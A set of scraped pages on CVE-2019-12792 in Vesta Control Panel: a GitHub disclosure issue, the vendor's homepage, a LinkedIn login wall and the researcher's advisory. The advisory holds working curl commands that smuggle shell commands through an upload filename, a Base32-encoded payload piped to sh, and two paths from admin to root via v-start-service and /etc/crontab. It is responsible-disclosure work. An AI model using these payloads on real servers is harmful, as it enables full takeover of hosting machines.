=== Content from twitter.com_94141420_20250121_032041.html ===



=== Content from www.linkedin.com_cca01b83_20250121_032039.html ===


LinkedIn and 3rd parties use essential and non-essential cookies to provide, secure, analyze and improve our Services, and to show you relevant ads (including **professional and job ads**) on and off LinkedIn. Learn more in our [Cookie Policy](https://www.linkedin.com/legal/cookie-policy).

Select Accept to consent or Reject to decline non-essential cookies for this use. You can update your choices at any time in your [settings](https://www.linkedin.com/mypreferences/g/guest-cookies).

Accept

Reject

# Sign in

Stay updated on your professional world.

Email or phone

Password

Show

[Forgot password?](/checkpoint/rp/request-password-reset?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2FshareArticle%2F%3Furl%3Dhttps%253A%252F%252Fcardaci%2Exyz%252Fadvisories%252F2019%252F08%252F12%252Fvesta-control-panel-0%2E9%2E8-24-privilege-escalation-in-the-upload-handler%252F%26title%3D%255BCVE-2019-12792%255D%2BVesta%2BControl%2BPanel%2B0%2E9%2E8-24%2B%25E2%2580%2594%2BPrivilege%2Bescalation%2Bin%2Bthe%2Bupload%2Bhandler)

Keep me logged in

Sign in

or

By clicking Continue, you agree to LinkedInâ€™s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

Sign in with Apple

Sign in with a passkey

## Weâ€™ve emailed a one-time link to your primary email address

Click on the link to sign in instantly to your LinkedIn account.

If you donâ€™t see the email in your inbox, check your spam folder.

Resend email

Back

New to LinkedIn? [Join now](/signup/cold-join?session_redirect=https%3A%2F%2Fwww.linkedin.com%2FshareArticle%2F%3Furl%3Dhttps%253A%252F%252Fcardaci.xyz%252Fadvisories%252F2019%252F08%252F12%252Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%252F%26title%3D%255BCVE-2019-12792%255D%2BVesta%2BControl%2BPanel%2B0.9.8-24%2B%25E2%2580%2594%2BPrivilege%2Bescalation%2Bin%2Bthe%2Bupload%2Bhandler)

![](https://ponf.linkedin.com/pixel/tracking.png?reqid=43c492c9-7ec4-49cb-ad35-846ebd385329&pageInstance=urn:li:page:checkpoint_lg_uasLogin;0h5SO4tQS9uu5htGIa2M3Q==&js=disabled)

Agree & Join LinkedIn

By clicking Continue, you agree to LinkedInâ€™s [User Agreement](/legal/user-agreement), [Privacy Policy](/legal/privacy-policy), and [Cookie Policy](/legal/cookie-policy).

*LinkedIn

Â© 2025*

* [User Agreement](/legal/user-agreement?trk=d_checkpoint_lg_consumerLogin_ft_user_agreement)
* [Privacy Policy](/legal/privacy-policy?trk=d_checkpoint_lg_consumerLogin_ft_privacy_policy)
* [Community Guidelines](/help/linkedin/answer/34593?lang=en&trk=d_checkpoint_lg_consumerLogin_ft_community_guidelines)
* [Cookie Policy](/legal/cookie-policy?trk=d_checkpoint_lg_consumerLogin_ft_cookie_policy)
* [Copyright Policy](/legal/copyright-policy?trk=d_checkpoint_lg_consumerLogin_ft_copyright_policy)
* [Send Feedback](/help/linkedin?trk=d_checkpoint_lg_consumerLogin_ft_send_feedback&lang=en)
* Language

  + Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© (Arabic)
  + à¦¬à¦¾à¦‚à¦²à¦¾ (Bangla)
  + ÄŒeÅ¡tina (Czech)
  + Dansk (Danish)
  + Deutsch (German)
  + Î•Î»Î»Î·Î½Î¹ÎºÎ¬ (Greek)
  + **English (English)**
  + EspaÃ±ol (Spanish)
  + ÙØ§Ø±Ø³ÛŒ (Persian)
  + Suomi (Finnish)
  + FranÃ§ais (French)
  + à¤¹à¤¿à¤‚à¤¦à¥€ (Hindi)
  + Magyar (Hungarian)
  + Bahasa Indonesia (Indonesian)
  + Italiano (Italian)
  + ×¢×‘×¨×™×ª (Hebrew)
  + æ—¥æœ¬èªž (Japanese)
  + í•œêµ­ì–´ (Korean)
  + à¤®à¤°à¤¾à¤ à¥€ (Marathi)
  + Bahasa Malaysia (Malay)
  + Nederlands (Dutch)
  + Norsk (Norwegian)
  + à¨ªà©°à¨œà¨¾à¨¬à©€ (Punjabi)
  + Polski (Polish)
  + PortuguÃªs (Portuguese)
  + RomÃ¢nÄƒ (Romanian)
  + Ð ÑƒÑÑÐºÐ¸Ð¹ (Russian)
  + Svenska (Swedish)
  + à°¤à±†à°²à±à°—à± (Telugu)
  + à¸ à¸²à¸©à¸²à¹„à¸—à¸¢ (Thai)
  + Tagalog (Tagalog)
  + TÃ¼rkÃ§e (Turkish)
  + Ð£ÐºÑ€Ð°Ñ—Ð½ÑÑŒÐºÐ° (Ukrainian)
  + Tiáº¿ng Viá»‡t (Vietnamese)
  + ç®€ä½“ä¸­æ–‡ (Chinese (Simplified))
  + æ­£é«”ä¸­æ–‡ (Chinese (Traditional))



=== Content from github.com_b4871255_20250121_032044.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1921)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Foutroll%2Fvesta%2Fissues%2F1921)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=outroll%2Fvesta)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[outroll](/outroll)
/
**[vesta](/outroll/vesta)**
Public

* [Notifications](/login?return_to=%2Foutroll%2Fvesta) You must be signed in to change notification settings
* [Fork
  1k](/login?return_to=%2Foutroll%2Fvesta)
* [Star
   3k](/login?return_to=%2Foutroll%2Fvesta)

* [Code](/outroll/vesta)
* [Issues
  387](/outroll/vesta/issues)
* [Pull requests
  31](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects
  0](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

Additional navigation options

* [Code](/outroll/vesta)
* [Issues](/outroll/vesta/issues)
* [Pull requests](/outroll/vesta/pulls)
* [Discussions](/outroll/vesta/discussions)
* [Actions](/outroll/vesta/actions)
* [Projects](/outroll/vesta/projects)
* [Security](/outroll/vesta/security)
* [Insights](/outroll/vesta/pulse)

# SECURITY: two privilege escalation from regular user to rootÂ #1921

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkOpenOpen[SECURITY: two privilege escalation from regular user to root](#top)#1921Copy linkAssignees [![dpeca](https://avatars.githubusercontent.com/u/177147?s=64&u=2ba716a5f89bd17544ac79324bb3a60d66ebab5b&v=4)](/dpeca)[![serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)](/serghey-rodin)Labels[security](https://github.com/outroll/vesta/issues?q=state%3Aopen%20label%3A%22security%22)![@cyrus-and](https://avatars.githubusercontent.com/u/1660263?u=f98b0d6c2f984a656573c0942c9aaf955d5e8013&v=4&size=80)
## Description

![@cyrus-and](https://avatars.githubusercontent.com/u/1660263?u=f98b0d6c2f984a656573c0942c9aaf955d5e8013&v=4&size=48)[cyrus-and](https://github.com/cyrus-and)opened [on Jul 29, 2019](https://github.com/outroll/vesta/issues/1921#issue-474169297)

(Sorry for the *dramatic* subject.)

Well, it's really disappointing and unprofessional to come to this...

Two months ago (2019-05-28) I disclosed two privilege escalation vulnerabilities to info@vestacp.com (and eventually also to dev@vestacp.com and skid@vestacp.com), I obtained no useful replies or actions so I'm trying to reach a wider audience by opening an issue here (and no, I won't join the forum).

As today the two vulnerabilities are still undisclosed as I fairly believe that a responsible disclosure approach is the right way to go. Yet we're pushing the boundaries here and I don't think the maintainers are being respectful of the userbase.

So this is my last attempt to get these issues fixed, after that I will disclose them anyway, fixed or not. Users having write access to this repo can reach me privately for details, it's even better if they reply to the original message sent to the above @vestacp.com addresses, provided that they're allowed to do that.

ðŸ‘13â¤ï¸1ðŸš€1ðŸ‘€2
## Metadata

### Assignees

* [![@dpeca](https://avatars.githubusercontent.com/u/177147?s=64&u=2ba716a5f89bd17544ac79324bb3a60d66ebab5b&v=4)dpeca](/dpeca)
* [![@serghey-rodin](https://avatars.githubusercontent.com/u/844452?s=64&v=4)serghey-rodin](/serghey-rodin)
### Labels

[security](https://github.com/outroll/vesta/issues?q=state%3Aopen%20label%3A%22security%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canâ€™t perform that action at this time.



=== Content from vestacp.com_53a60a73_20250121_032042.html ===


[**Vesta 2.0 is coming soon!** We are working on a full rebuild of Vesta. Learn more â†’](/docs/vesta-2-development)

DismissX[![VestaCP logo](data:image/svg+xml...)](/)

* [Features](/features)
* [Install](/install)
* [Pricing](/pricing)
* [Sponsors](/sponsors)
* [Docs](/docs)
* [Forum](https://forum.vestacp.com/)
* [Contact](/contact)
* [Get Started](/install)

 [Get started](/install)
# Simple Hosting Control Panel

Vesta is an open source Hosting Control Panel that is free to
use under GPLv3. It provides an easy to use control panel that
allows the management of websites, DNS, mail, backups, and more!

[Get Started](/install)![](/_nuxt/home-hero-img.BDv9ZOD4.png)
## Works with your favorite stack

![php](data:image/png;base64...)![MySQL](data:image/png;base64...)![PostgreSQL](data:image/png;base64...)![redhat](data:image/png;base64...)![Debian](data:image/png;base64...)![Ubuntu](data:image/png;base64...)
## Fast

1
## Ultra Fast Web Interface

And its even faster with keyboard shortcuts

2
## Simple installation from a single command:

Support for most Linux distributions is coming soon

3
## Efficient with Low Resource Usage

Serve 10,000 users per day on a 512MB VPS

## Internationalization

Web interface is adapted to 26 languages and regions around the world.

[Get started](/install)![](/_nuxt/home-world.ChFa2ByE.png)
## Secure

1
## Firewall

Built in firewall resolves all common issues. Itâ€™s packed with enterprise-class features such as smart filters for various services (apache, exim, ssh, etc) in order to ban any host IP address that makes too many login attempts.

2
## Linux Passwords

Our password implementation relies on the Linux PAM authentication mechanism which employs sha512 hashing algorithm, to provide unique and secure passwords.

3
## Open Source

You can always inspect the code and make sure it's backdoor free and has no spying modules. Open source means you can modify the code yourself if you need to.

![](/_nuxt/monitoring.CVQJKGC1.png)
## Monitoring & logging

Built-in web site analytics systems that provide whole range of visitors information such as:
Unique visitors, Number of visits, Pages, Hits, Countries, Visits duration, Operating Systems, Browsers, and more!

[Get Started](/install)
## Backups

1
## Data loss prevention

You can manage backups the way you want to. You can exclude some files or directories or specific account or even domains.

2
## Backup Schedules

Number of copies or backup frequency can be easily changed. By default you get 3 backups created by cron job at night.

3
## External FTP backups

You can enable backup upload by ftp to external servers. S3 and bucket compatibility coming soon!

## CLI interface

Like to work in terminal? Vesta gives you full control at your fingertips.

[Get started](/install)![](/_nuxt/cli-interface.f--2rRaP.png) 25000  Vesta installs every month  500000  Servers running Vesta
## Start working with Vesta

Experiment and grow your development or hosting business

[Get Started](/install)[![](data:image/svg+xml...)](/)

* [Features](/features)
* [Install](/install)
* [Pricing](/pricing)
* [Sponsors](/sponsors)
* [Docs](/docs)
* [Forum](https://forum.vestacp.com/)
 Licencing:

The GNU General Public Licence is a free, copyleft licence for software and other kinds of works. Its free to change, modify and redistribute source code.

 Source code:  [http://github.com/outroll/vesta](https://github.com/outroll/vesta)  For hosters:

We have special licensing options for hosting companies, just  [contact us](/cdn-cgi/l/email-protection#6f060109002f190a1c1b0e0c1f410c0002)  to chat.

 [[emailÂ protected]](/cdn-cgi/l/email-protection#462f28202906302335322725366825292b)  [[emailÂ protected]](/cdn-cgi/l/email-protection#40292e262f00362533342123306e232f2d)  Copyright Â© 2019-2024 Vestaâ„¢ Control Panel. All right reserved.


=== Content from cardaci.xyz_161ea9af_20250121_011258.html ===

[Home](/)
#
[Permalink](/advisories/2019/08/12/vesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler/)
[Twitter](https://twitter.com/intent/tweet?text=%5BCVE-2019-12792%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+upload+handler%0A%0Ahttps%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F "Share on Twitter")
[Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F "Share on Facebook")
[LinkedIn](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcardaci.xyz%2Fadvisories%2F2019%2F08%2F12%2Fvesta-control-panel-0.9.8-24-privilege-escalation-in-the-upload-handler%2F&title=%5BCVE-2019-12792%5D+Vesta+Control+Panel+0.9.8-24+%E2%80%94+Privilege+escalation+in+the+upload+handler "Share on LinkedIn")

# [CVE-2019-12792] Vesta Control Panel 0.9.8-24 â€” Privilege escalation in the upload handler

Andrea Cardaci â€” 12 August 2019

|  |  |
| --- | --- |
| **Discovered** | 2019-03-15 |
| **Author** | Andrea Cardaci |
| **Product** | [Vesta Control Panel](https://vestacp.com/) |
| **Tested versions** | 0.9.8-24 |
| **CVE** | [CVE-2019-12792](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12792) |

## Abstract

The insufficient shell escaping mechanism used during the invocation of the `exec` PHP function allows a registered user to run arbitrary system commands as the `admin` user, to whom VestaCP grants full access. A malicious registered user can thus escalate its privileges up to `root` by submitting a POST request to the web application.

[HestiaCP](https://www.hestiacp.com/) (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.

## Details

The PHP script reachable at `/upload/UploadHandler.php` naively uses `'...'` to shell-escape the user input (instead of using `escapeshellarg`):

```
exec (VESTA_CMD . "v-copy-fs-file ". USERNAME ." {$uploaded_file} '{$file_path}'", $output, $return_var);

```

The `$file_path` variable is controlled by the user as it corresponds to the name of the file being uploaded. By crafting a proper file name it is possible to escape the single quotes and *blindly* run additional commands as the `admin` user (the one that runs the web server in VestaCP).

For example, the following `curl` invocation uses the `sleep` command to prove the RCE success:

```
$ PHPSESSID=... # grab it from an authenticated regular user session
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';sleep 5;#\""
real    0m5.097s
user    0m0.032s
sys     0m0.004s

```

Since the file name is filtered through the `basename` PHP function, the payload cannot contain `/`. Follows a more general solution that allows to execute arbitrary commands by using the Base32 encoding:

```
$ COMMAND='[ -w ~admin/.bashrc ] && sleep 5'
$ PAYLOAD="$(echo "$COMMAND" | base32 -w0)"
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';echo $PAYLOAD | base32 -d | sh;#\""
real    0m5.087s
user    0m0.028s
sys     0m0.000s

```

The above also proves that is possible to write files in the `admin` home directory.

### From admin to root access

The `admin` user ultimately has full access to the target machine, yet VestaCP seems to make it hard for it to run superuser commands. For completeness, follows two possible ways to accomplish that.

#### Misusing the `v-start-service` command

The `service` system command provides a way to execute arbitrary executables and not only init scripts[1](#fn:service). Since `v-start-service` is a merely wrapper around `service`, it is possible to exploit it to run arbitrary executables as `root`.

Set the `COMMAND` variable as follows:

```
$ COMMAND='
    echo "id >/usr/local/vesta/web/proof" >/tmp/x
    chmod +x /tmp/x
    sudo /usr/local/vesta/bin/v-start-service ../../tmp/x'

```

Run the remaining commands as above, then check that the proof file is created in the web server root:

```
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)

```
#### Using cron

One simple way for the `admin` user to legitimately execute `root` commands is to replace the `/etc/crontab` file and restart the cron daemon using the `v-change-sys-service-config` VestaCP utility. Set the `COMMAND` variable as follows:

```
$ COMMAND='
    echo "* * * * * root id >/usr/local/vesta/web/proof" >/tmp/x
    sudo /usr/local/vesta/bin/v-change-sys-service-config /tmp/x cron yes'

```

Run the remaining commands as above, then after one minute check that the proof file is created in the web server root:

```
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)

```
## Other instances of similar vulnerabilities

Several other instances of the same or similar problems have been found in the VestaCP source code. The following list[2](#fn:git-tree) is a best-effort attempt to enumerate such instances, they are not tested and often are not exploitable in practice or not interesting since only the `admin` user can reach the code, but should nevertheless be fixed[3](#fn:fixed):

```
// /usr/local/vesta/web/edit/mail/index.php:75
exec (VESTA_CMD."v-list-mail-account-autoreply ".$user." '".$v_domain."' '".$v_account."' json", $output, $return_var);

// /usr/local/vesta/web/edit/mail/index.php:231
exec (VESTA_CMD."v-delete-mail-account-alias ".$v_username." ".$v_domain." ".$v_account." '".$alias."'", $output, $return_var);

// /usr/local/vesta/web/edit/mail/index.php:257
exec (VESTA_CMD."v-delete-mail-account-forward ".$v_username." ".$v_domain." ".$v_account." '".$forward."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:342
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:359
exec (VESTA_CMD."v-delete-backup-host '". $v_backup_type ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:367
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:389
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:406
exec (VESTA_CMD."v-delete-backup-host '". $v_backup_type ."'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:39
exec (VESTA_CMD."v-list-web-domain-ssl ".$user." '".$v_domain."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:142
exec (VESTA_CMD."v-list-dns-domain ".$v_username." '".$v_alias."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:145
exec (VESTA_CMD."v-change-dns-domain-ip ".$v_username." '".$v_alias."' ".$v_ip, $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:176
exec (VESTA_CMD."v-delete-web-domain-alias ".$v_username." ".$v_domain." '".$alias."' 'no'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:184
exec (VESTA_CMD."v-delete-dns-on-web-alias ".$v_username." ".$v_domain." '".$alias."' 'no'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:317
exec (VESTA_CMD."v-list-web-domain-ssl ".$user." '".$v_domain."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:370
exec (VESTA_CMD."v-add-letsencrypt-domain ".$user." ".$v_domain." '".$l_aliases."' 'no'", $output, $return_var);

// /usr/local/vesta/web/reset/mail/index.php:135
exec (VESTA_CMD."v-get-mail-account-value '".$v_user."' ".$v_domain." ".$v_account." 'md5'", $output, $return_var);

// /usr/local/vesta/web/reset/mail/index.php:154
exec (VESTA_CMD."v-change-mail-account-password '".$v_user."' ".$v_domain." ".$v_account." ".$v_new_password, $output, $return_var);

```
## Timeline

2019-05-28
Disclosed to the VestaCP team.
2019-06-10
MITRE assigns [CVE-2019-12792](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12792) to this vulnerability.
2019-07-29
Final warning via [GitHub issue](https://github.com/serghey-rodin/vesta/issues/1921) since emails have been ignored.
2019-07-30
The VestaCP author asks one more week to fix the issue and publish a new release.
2019-08-07
The VestaCP team [fixes](https://github.com/serghey-rodin/vesta/commit/b17b4b205df0c01dada54d9684cfaa94b924064a) the vulnerability.
2019-08-15
The VestaCP team [releases](https://github.com/serghey-rodin/vesta/commit/868dd8b146e76ea3c83c26855ae2f60b22d989d2) version 0.9.8-25.

1. See the [GTFOBins entry](https://gtfobins.github.io/gtfobins/service/).Â [â†©](#fnref:service)
2. Locations refer to the Git commit [e1fb811caf73e5d8de49e3d2a0098a1afb0f647f](https://github.com/serghey-rodin/vesta/tree/e1fb811caf73e5d8de49e3d2a0098a1afb0f647f).Â [â†©](#fnref:git-tree)
3. Some of them (and others) are fixed in a subsequent [pull request](https://github.com/serghey-rodin/vesta/pull/1865/commits/0831a198b86a4760e83c0eaec78d84bab7098e6c).Â [â†©](#fnref:fixed)

Andrea Cardaci Â© 2024. All rights reserved (unless explicitly stated otherwise).


